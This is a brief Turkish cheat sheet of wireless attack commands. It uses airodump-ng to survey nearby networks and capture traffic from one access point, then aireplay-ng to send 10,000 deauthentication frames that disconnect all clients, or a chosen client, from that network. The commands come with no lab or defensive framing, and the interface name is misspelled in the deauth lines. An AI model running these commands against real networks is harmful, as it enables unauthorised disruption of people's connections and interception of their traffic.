### Ağlar İle İlgili Bilgi Toplama

~iwconfig //monitor moda geç kontrol
~airodump-ng wlan0mon //ağların bilgileri

~airodump-ng --channel 9 --bssid E4:C3:2A:B7:23:90 --write airodumptest wlan0mon //channel ve mac adresi bilinmeli

## Ağdan Atma

--Tüm Cihazları Ağdan Atma--

~aireplay-ng --deauth 10000 -a E4:C3:2A:B7:23:90 wlam0mon

--Belirli Cihazları Ağdan Atma--

~aireplay-ng --deauth 10000 -a E4:C3:2A:B7:23:90 -c {atmak istediğimiz ağın mac adresi} wlam0mon
